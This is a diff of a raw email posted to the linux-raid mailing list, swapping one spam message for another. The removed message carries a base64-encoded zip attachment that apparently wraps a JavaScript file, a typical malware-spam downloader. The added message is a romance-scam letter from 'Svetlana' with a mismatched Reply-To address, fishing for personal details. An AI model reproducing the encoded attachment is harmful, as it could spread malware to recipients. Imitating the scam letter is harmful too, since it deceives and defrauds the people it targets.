@@ -1,74 +1,23 @@
-From: <citydesk@thereporteronline.com>
-Subject: (unknown)
-Date: Mon, 26 Jun 2017 22:14:02 -0000
-Message-ID: <149851524243.4332.9862824546416298332@myrepublic.com.sg>
+From: "Lucky SV" <laura.kirk@btconnect.com>
+Subject: Craving for a lifetime friend.
+Date: Tue, 27 Jun 2017 07:44:55 +0700
+Message-ID: <DE4936A95E2258CD2688182711E992300E07@btconnect.com>
+Reply-To: c.r.i.s.t.o.f.or.kolumb.1451@gmail.com
 Mime-Version: 1.0
-Content-Type: application/zip; name="EMAIL_9158645_linux-raid.zip"
-Content-Transfer-Encoding: base64
+Content-Type: text/plain;
 Return-path: <linux-raid-owner@vger.kernel.org>
-Content-Disposition: attachment
-Subject: 
 Sender: linux-raid-owner@vger.kernel.org
 To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-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
+Hello how are you?
+
+My name is Svetlana, we met you in May on a dating site.
+I did not have time to write to you. Now I'm on vacation and decided to get to know you.
+I now have a lot of free time. I'm 27 years old, I'm not married and I do not have any children. 
+My heart is free. Write me about yourself, about work, about your life. 
+Are you looking for a soul mate? Do you want to start a family? What do you do in your life? 
+I will be glad of your answer, I hope we can become good friends.
+
+Svetlana.
+
